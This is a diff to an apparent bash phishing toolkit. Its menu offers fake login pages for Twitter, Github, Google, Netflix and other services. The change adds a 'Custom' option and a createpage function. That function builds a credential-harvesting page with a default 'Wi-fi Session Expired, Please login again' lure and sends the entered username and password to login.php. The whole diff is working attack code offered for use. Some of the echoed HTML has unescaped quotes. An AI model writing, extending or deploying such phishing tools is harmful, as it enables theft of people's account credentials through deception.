@@ -15,7 +15,7 @@ Main() {
     printf "          ${RED}[04]${CYAN} Twitter\e[0m        ${RED}[20]${CYAN} Messenger   \e[0m   ${RED}[36]${CYAN} Spotify\e[0m          \n"                
     printf "          ${RED}[05]${CYAN} Github\e[0m         ${RED}[21]${CYAN} GitLab   \e[0m      ${RED}[37]${CYAN} Netflix\e[0m          \n"                
     printf "          ${RED}[06]${CYAN} Google\e[0m         ${RED}[22]${CYAN} Twitch   \e[0m      ${RED}[38]${CYAN} Stackoverflow\e[0m         \n"
-    printf "          ${RED}[07]${CYAN} Origin\e[0m         ${RED}[23]${CYAN} MySpace    \e[0m             \n"
+    printf "          ${RED}[07]${CYAN} Origin\e[0m         ${RED}[23]${CYAN} MySpace    \e[0m    ${RED}[39]${CYAN} Custom\e[0m          \n"
     printf "          ${RED}[08]${CYAN} Yahoo\e[0m          ${RED}[24]${CYAN} Badoo   \e[0m                \n"        
     printf "          ${RED}[09]${CYAN} Linkedin\e[0m       ${RED}[25]${CYAN} VK   \e[0m                   \n"         
     printf "          ${RED}[10]${CYAN} Protonmail\e[0m     ${RED}[26]${CYAN} Yandex   \e[0m               \n"
@@ -175,6 +175,11 @@ Main() {
     elif [[ $option == 38 ]]; then
     website="stackoverflow"
     start
+    
+    elif [[ $option == 39 ]]; then
+    website="custom"
+    createpage
+    start
 
     else 
     printf "${RED}Invaild Oprion"
@@ -333,6 +338,72 @@ checkfound() {
     fi
     sleep 1
     done 
+}
+createpage() {
+    default_cap1="Wi-fi Session Expired"
+    default_cap2="Please login again."
+    default_user_text="Username:"
+    default_pass_text="Password:"
+    default_sub_text="Log-In"
+
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
+    cap1="${cap1:-${default_cap1}}"
+
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
+    cap2="${cap2:-${default_cap2}}"
+
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
+    user_text="${user_text:-${default_user_text}}"
+
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
+    pass_text="${pass_text:-${default_pass_text}}"
+
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+    sub_text="${sub_text:-${default_sub_text}}"
+
+
+    echo "<!DOCTYPE html>" > sites/custom/login.html
+    echo "<html>" >> sites/custom/login.html
+    echo "<body bgcolor=\"White\" text=\"Black\">" >> sites/custom/login.html
+    echo 	"<center>" >> sites/custom/login.html
+    echo	"<h1> $cap1 </h1>" >> sites/custom/login.html
+    IFS=$'\n'
+    echo	"<h2> $cap2 </h2>" >> sites/custom/login.html
+    IFS=$'\n'
+    echo "<style>" >> sites/custom/login.html
+    echo "input {" >> sites/custom/login.html
+    echo	"border: 1px solid gray;" >> sites/custom/login.html
+    echo	"border-radius: 4px;" >> sites/custom/login.html
+    echo	"margin: 3px;" >> sites/custom/login.html
+    echo	"}" >> sites/custom/login.html
+    echo "</style>" >> sites/custom/login.html
+    echo "<style>" >> sites/custom/login.html
+    echo "button {" >> sites/custom/login.html
+    echo	"background-color: white;" >> sites/custom/login.html
+    echo	"color: black;" >> sites/custom/login.html
+    echo	"border: 1px solid black;" >> sites/custom/login.html
+    echo	"padding: 1px 18px;" >> sites/custom/login.html
+    echo	"}" >> sites/custom/login.html
+    echo "</style>" >> sites/custom/login.html
+    echo "<form method="POST" action="login.php">" >> sites/custom/login.html
+    echo "<label> $user_text </label>" >> sites/custom/login.html
+    IFS=$'\n'
+    echo "<input type="text" name="username"></input>" >> sites/custom/login.html
+    IFS=$'\n'
+    echo "<br>" >> sites/custom/login.html
+    IFS=$'\n'
+    echo "<label> $pass_text </label>" >> sites/custom/login.html
+    IFS=$'\n'
+    echo "<input type="password" name="password"></input>" >> sites/custom/login.html
+    IFS=$'\n'
+    echo "<br><br>" >> sites/custom/login.html
+    IFS=$'\n'
+    echo "<button type="submit"> $sub_text </button>" >> sites/custom/login.html
+    echo "</form>" >> sites/custom/login.html
+    echo "</center>" >> sites/custom/login.html
+    echo "</body>" >> sites/custom/login.html
+    echo "</html>" >> sites/custom/login.html
+    
 }
 Need() {
     command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
